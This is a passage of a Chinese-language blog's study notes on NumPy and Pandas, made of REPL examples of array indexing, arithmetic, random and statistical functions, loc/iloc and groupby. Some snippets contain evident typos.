class="number">0.</span>, <span class="number">0.</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">        [<span class="number">0.</span>, <span class="number">0.</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.ndim</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.shape</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'s'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.shape</span><br><span class="line">(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.size  <span class="comment">#数组全部元素的数量</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.dtype  <span class="comment">#数组中元素的类型</span></span><br><span class="line">dtype(<span class="string">'float64'</span>)</span><br></pre></td></tr></table></figure><h4 id="数组索引，切片，赋值"><a href="#数组索引，切片，赋值" class="headerlink" title="数组索引，切片，赋值"></a>数组索引，切片，赋值</h4><p>‘…’符号表示将所有未指定索引的维度均赋为 ‘：’<br>‘：’在python中表示该维所有元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">6</span>]&gt;&gt;&gt; a = np.array([[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>,:]</span><br><span class="line">array([<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a[<span class="number">1</span>,<span class="number">1</span>:<span class="number">2</span>])</span><br><span class="line">[<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>,:] =  [<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[ <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>]])&gt;&gt;&gt; <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="number">10</span>*x+y</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.fromfunction(f,(<span class="number">5</span>,<span class="number">4</span>),dtype = int)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>],</span><br><span class="line">       [<span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>],</span><br><span class="line">       [<span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="number">10</span>*x+y</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.fromfunction(f,(<span class="number">5</span>,<span class="number">4</span>),dtype = int)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>],</span><br><span class="line">       [<span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>],</span><br><span class="line">       [<span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>]])</span><br></pre></td></tr></table></figure><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a =  np.ones((<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.eye(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a &gt;<span class="number">2</span></span><br><span class="line">array([[<span class="literal">False</span>, <span class="literal">False</span>],</span><br><span class="line">       [<span class="literal">False</span>, <span class="literal">False</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b &gt;<span class="number">1</span></span><br><span class="line">array([[<span class="literal">False</span>, <span class="literal">False</span>],</span><br><span class="line">       [<span class="literal">False</span>, <span class="literal">False</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a-b</span><br><span class="line">array([[<span class="number">0.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">0.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a+b</span><br><span class="line">array([[<span class="number">2.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">2.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b*<span class="number">2</span></span><br><span class="line">array([[<span class="number">2.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">2.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(a*<span class="number">2</span>)*(b*<span class="number">2</span>)</span><br><span class="line">array([[<span class="number">4.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">4.</span>]])</span><br><span class="line"> b/(a*<span class="number">2</span>) <span class="comment">#数组与数组相除，按位置一对一相除</span></span><br><span class="line">array([[<span class="number">0.5</span>, <span class="number">0.</span> ],</span><br><span class="line">       [<span class="number">0.</span> , <span class="number">0.5</span>]])</span><br><span class="line">a.dot(b)                    <span class="comment"># matrix product，矩阵乘</span></span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b =a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b <span class="keyword">is</span> a  <span class="comment">#浅拷贝</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = a.copy()<span class="comment">#深拷贝</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c <span class="keyword">is</span> a</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.sin(a)</span><br><span class="line">array([[ <span class="number">0.84147098</span>,  <span class="number">0.84147098</span>],</span><br><span class="line">       [ <span class="number">0.84147098</span>,  <span class="number">0.84147098</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.max(a)</span><br><span class="line"><span class="number">1.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.floor(a)  </span><br><span class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>],</span><br><span class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.exp(a)               <span class="comment">#e^x</span></span><br><span class="line">array([[ <span class="number">2.71828183</span>,  <span class="number">2.71828183</span>],</span><br><span class="line">       [ <span class="number">2.71828183</span>,  <span class="number">2.71828183</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(np.vstack((a,b)))   <span class="comment">#合并数组</span></span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>] </span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(np.hstack((a,b)))   <span class="comment">#合并数组</span></span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a.transpose())       <span class="comment">#转置</span></span><br></pre></td></tr></table></figure><hr><p>numpy.linalg模块中有很多关于矩阵运算的方法</p><h3 id="mean"><a href="#mean" class="headerlink" title="mean"></a>mean</h3><p>define:</p><p><strong>numpy.mean</strong> ( a, axis=None, dtype=None, out=None, keepdims=&lt;class numpy._globals._NoValue at 0x40b6a26c&gt; )</p><p>  mean()函数功能：求取均值</p><p>经常操作的参数为axis，以m * n矩阵举例：</p><p>axis 不设置值，对 m*n 个数求均值，返回一个实数</p><p>axis = 0：压缩行，对各列求均值，返回 1* n 矩阵</p><p>axis =1 ：压缩列，对各行求均值，返回 m *1 矩阵</p><h3 id="二元函数"><a href="#二元函数" class="headerlink" title="二元函数"></a>二元函数</h3><p><img src="/images/Numpy/image-20200408181331498.png" alt="image-20200408181331498"></p><h3 id="CSV-文件"><a href="#CSV-文件" class="headerlink" title="CSV 文件"></a>CSV 文件</h3><p>用来存储批量文件</p><p><img src="/images/Numpy/image-20200408202827814.png" alt="image-20200408202827814"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.savetxt(frame,arry,<span class="attribute">fmt</span>=<span class="string">'%.18e'</span>, <span class="attribute">delimiter</span>=None)</span><br></pre></td></tr></table></figure><p><img src="/images/Numpy/image-20200408203216749.png" alt="image-20200408203216749"></p><p><img src="/images/Numpy/image-20200408204735471.png" alt="image-20200408204735471"></p><p><img src="/images/Numpy/image-20200408205425758.png" alt="image-20200408205425758"></p><h3 id="随机数函数字库"><a href="#随机数函数字库" class="headerlink" title="随机数函数字库"></a>随机数函数字库</h3><p><img src="/images/Numpy/image-20200409094640413.png" alt="image-20200409094640413"></p><p><img src="/images/Numpy/image-20200409095240039.png" alt="image-20200409095240039"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">sn = np.random.randn(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">print(sn)</span><br><span class="line"></span><br><span class="line">b = np.random.randint(<span class="number">100</span>, <span class="number">200</span>,(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">10</span>)</span><br><span class="line">b = np.random.randint(<span class="number">100</span>,<span class="number">200</span>,(<span class="number">3</span>,<span class="number">4</span>))    </span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">"-------random 2"</span>)</span><br><span class="line">a = np.random.randint(<span class="number">100</span>,<span class="number">200</span>,(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">print(a)</span><br><span class="line">np.random.shuffle(a)</span><br><span class="line">print(a)</span><br><span class="line">np.random.shuffle(a)</span><br><span class="line">print(a)</span><br><span class="line">np.random.permutation(a)</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">"---------choice"</span>)</span><br><span class="line">b = np.random.randint(<span class="number">100</span>,<span class="number">200</span>,(<span class="number">8</span>,))     </span><br><span class="line">print(b)</span><br><span class="line">np.random.choice(b,(<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line">print(b)</span><br><span class="line">np.random.choice(b,(<span class="number">3</span>,<span class="number">2</span>),replace=<span class="literal">False</span>)</span><br><span class="line">print(b)</span><br><span class="line">np.random.choice(b,(<span class="number">3</span>,<span class="number">2</span>),p=b/np.sum(b))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h3 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h3><p><img src="/images/Numpy/image-20200409100933278.png" alt="image-20200409100933278"></p><p><img src="/images/Numpy/image-20200409101934983.png" alt="image-20200409101934983"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.arange(<span class="number">15</span>).reshape(<span class="number">3</span>, <span class="number">5</span> )</span><br><span class="line">print(a)</span><br><span class="line">np.sum(a)</span><br><span class="line">print(a)</span><br><span class="line">np.mean(a, axis=<span class="number">1</span>)</span><br><span class="line">print(a)</span><br><span class="line">np.average(a,axis=<span class="number">0</span>,weigets=[<span class="number">10</span>,<span class="number">5</span>,<span class="number">1</span>])</span><br><span class="line">print(a)</span><br><span class="line">np.std(a)</span><br><span class="line">print(a)</span><br><span class="line">np.var(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h3 id="梯度函数"><a href="#梯度函数" class="headerlink" title="梯度函数"></a>梯度函数</h3><p><img src="/images/Numpy/image-20200409102237925.png" alt="image-20200409102237925"></p><p>梯度： 连续值之间的变化率， 即斜率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">imprt numoy <span class="keyword">as</span> np </span><br><span class="line">a = np.random.randint(<span class="number">0</span>,<span class="number">20</span>,(<span class="number">5</span>))</span><br><span class="line">print(a)</span><br><span class="line">np.gradient(a)</span><br><span class="line">b = np.random.randint(<span class="number">0</span>,<span class="number">20</span>,(<span class="number">5</span>))</span><br><span class="line">print(b)</span><br><span class="line">c = numpy.rando.randint(<span class="number">0</span>,<span class="number">50</span>,(<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line">np.grdient(c)</span><br></pre></td></tr></table></figure><h3 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h3><p><img src="/images/Numpy/image-20200409102814685.png" alt="image-20200409102814685"></p><p><img src="/images/Numpy/image-20200409102908011.png" alt="image-20200409102908011"></p><p><img src="/images/Numpy/image-20200409102956182.png" alt="image-20200409102956182"></p><p><img src="/images/Numpy/image-20200409103128814.png" alt="image-20200409103128814"></p><p><img src="/images/Numpy/image-20200409104204447.png" alt="image-20200409104204447"></p><p>###-0-0 星乘(*)和点乘(.dot)的区别</p><p>星乘表示矩阵内各对应位置相乘，矩阵a*b下标(0,0)=矩阵a下标(0,0) x 矩阵b下标(0,0)；</p><p>点乘表示求矩阵内积，二维数组称为矩阵积（mastrix product）                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             </p><p>一个行向量乘以一个列向量称作向量的内积，又叫作点积，结果;一个数；</p><p>一个列向量乘以一个行向量称作向量的外积，外积是一种特殊的<a href="http://zh.wikipedia.org/wiki/克罗内克积" target="_blank" rel="noopener">克罗内克积</a>，结果是一个矩阵，</p><h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="loc-，iloc"><a href="#loc-，iloc" class="headerlink" title="loc ，iloc"></a>loc ，iloc</h4><p>loc()函数：通过行索引 “Index” 中的具体值来取行数据（<strong>如取”Index”为”A”的行</strong>）</p><p>iloc()函数：通过行号来取数据</p><p><img src="/images/Numpy/20181202180501231.png" alt="img"></p><p><img src="/images/Numpy/20181202180517553.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="number">3.</span> *<span class="comment">#创建一个Dataframe*</span></span><br><span class="line"><span class="number">4.</span> data=pd.DataFrame(np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>),index=list(<span class="string">'abcd'</span>),columns=list(<span class="string">'ABCD'</span>))</span><br><span class="line"><span class="number">5.</span>  </span><br><span class="line"><span class="number">6.</span> In[<span class="number">1</span>]: data</span><br><span class="line"><span class="number">7.</span> Out[<span class="number">1</span>]: </span><br><span class="line"><span class="number">8.</span> ​    A   B   C   D</span><br><span class="line"><span class="number">9.</span> a   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">10.</span> b   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">11.</span> c   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">12.</span> d  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">13.</span>  </span><br><span class="line"><span class="number">14.</span> *<span class="comment">#取索引为'a'的行*</span></span><br><span class="line"><span class="number">15.</span> In[<span class="number">2</span>]: data.loc[<span class="string">'a'</span>]</span><br><span class="line"><span class="number">16.</span> Out[<span class="number">2</span>]:</span><br><span class="line"><span class="number">17.</span> A    <span class="number">0</span></span><br><span class="line"><span class="number">18.</span> B    <span class="number">1</span></span><br><span class="line"><span class="number">19.</span> C    <span class="number">2</span></span><br><span class="line"><span class="number">20.</span> D    <span class="number">3</span></span><br><span class="line"><span class="number">21.</span>  </span><br><span class="line"><span class="number">22.</span> *<span class="comment">#取第一行数据，索引为'a'的行就是第一行，所以结果相同*</span></span><br><span class="line"><span class="number">23.</span> In[<span class="number">3</span>]: data.iloc[<span class="number">0</span>]</span><br><span class="line"><span class="number">24.</span> Out[<span class="number">3</span>]:</span><br><span class="line"><span class="number">25.</span> A    <span class="number">0</span></span><br><span class="line"><span class="number">26.</span> B    <span class="number">1</span></span><br><span class="line"><span class="number">27.</span> C    <span class="number">2</span></span><br><span class="line"><span class="number">28.</span> D    <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In[<span class="number">4</span>]:data.loc[:,[<span class="string">'A'</span>]] <span class="comment">#取'A'列所有行，多取几列格式为 data.loc[:,['A','B']]</span></span><br><span class="line">Out[<span class="number">4</span>]: </span><br><span class="line">    A</span><br><span class="line">a   <span class="number">0</span></span><br><span class="line">b   <span class="number">4</span></span><br><span class="line">c   <span class="number">8</span></span><br><span class="line">d  <span class="number">12</span></span><br><span class="line"> </span><br><span class="line">In[<span class="number">5</span>]:data.iloc[:,[<span class="number">0</span>]] <span class="comment">#取第0列所有行，多取几列格式为 data.iloc[:,[0,1]]</span></span><br><span class="line">Out[<span class="number">5</span>]: </span><br><span class="line">    A</span><br><span class="line">a   <span class="number">0</span></span><br><span class="line">b   <span class="number">4</span></span><br><span class="line">c   <span class="number">8</span></span><br><span class="line">d  <span class="number">12</span></span><br><span class="line">In[<span class="number">6</span>]:data.loc[[<span class="string">'a'</span>,<span class="string">'b'</span>],[<span class="string">'A'</span>,<span class="string">'B'</span>]] <span class="comment">#提取index为'a','b',列名为'A','B'中的数据</span></span><br><span class="line">Out[<span class="number">6</span>]: </span><br><span class="line">   A  B</span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"> </span><br><span class="line">In[<span class="number">7</span>]:data.iloc[[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>]] <span class="comment">#提取第0、1行，第0、1列中的数据</span></span><br><span class="line">Out[<span class="number">7</span>]: </span><br><span class="line">   A  B</span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"> <span class="comment">#### groupby()</span></span><br></pre></td></tr></table></figure><h4 id="groupby"><a href="#groupby" class="headerlink" title="groupby"></a>groupby</h4><p><strong><em>groupby函数主要的作用是进行数据的分组以及分组后地组内运算！\</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df = pd.DataFrame(&#123; <span class="string">'key1'</span> :[ <span class="string">'a'</span> , <span class="string">'a'</span> , <span class="string">'b'</span> , <span class="string">'b'</span> , <span class="string">'a'</span> ],</span><br><span class="line"><span class="meta">... </span>    <span class="string">'key2'</span> :[ <span class="string">'one'</span> , <span class="string">'two'</span> , <span class="string">'one'</span> , <span class="string">'two'</span> , <span class="string">'one'</span> ],</span><br><span class="line"><span class="meta">... </span>    <span class="string">'data1'</span> :np.random.randn( <span class="number">5</span> ),</span><br><span class="line"><span class="meta">... </span>    <span class="string">'data2'</span> :np.random.randn( <span class="number">5</span> )&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df</span><br><span class="line">       data1     data2 key1 key2</span><br><span class="line"><span class="number">0</span> - <span class="number">0.410673</span>  <span class="number">0.519378</span>    a  one</span><br><span class="line"><span class="number">1</span> - <span class="number">2.120793</span>  <span class="number">0.199074</span>    a  two</span><br><span class="line"><span class="number">2</span>  <span class="number">0.642216</span> - <span class="number">0.143671</span>    b  one</span><br><span class="line"><span class="number">3</span>  <span class="number">0.975133</span> - <span class="number">0.592994</span>    b  two</span><br><span class="line"><span class="number">4</span> - <span class="number">1.017495</span> - <span class="number">0.530459</span>    a  one</span><br><span class="line"><span class="comment">#假设你想要按key1进行分组，并计算data1列的平均值，我们可以访问data1，并根据key1调用groupby：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>grouped = df[ <span class="string">'data1'</span> ].groupby(df[ <span class="string">'key1'</span> ])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>grouped</span><br><span class="line">&lt;pandas.core.groupby.SeriesGroupBy object at <span class="number">0x04120D70</span> &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#变量grouped是一个GroupBy对象，它实际上还没有进行任何计算，只是含有一些有关分组键df['key1']的中间数据而已，然后我们可以调用GroupBy的mean方法来计算分组平均值：</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>grouped.mean()</span><br><span class="line">key1</span><br><span class="line">a      - <span class="number">1.182987</span></span><br><span class="line">b       <span class="number">0.808674</span></span><br><span class="line">dtype: float64</span><br><span class="line"> <span class="comment">#说明：数据（Series）根据分组键进行了聚合，产生了一个新的Series，其索引为key1列中的唯一值。之所以结果中索引的名称为key1，是因为原始DataFrame的列df['key1']就叫这个名字。</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、如果我们一次传入多个数组，就会得到不同的结果：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>means = df[ <span class="string">'data1'</span> ].groupby([df[ <span class="string">'key1'</span> ], df[ <span class="string">'key2'</span> 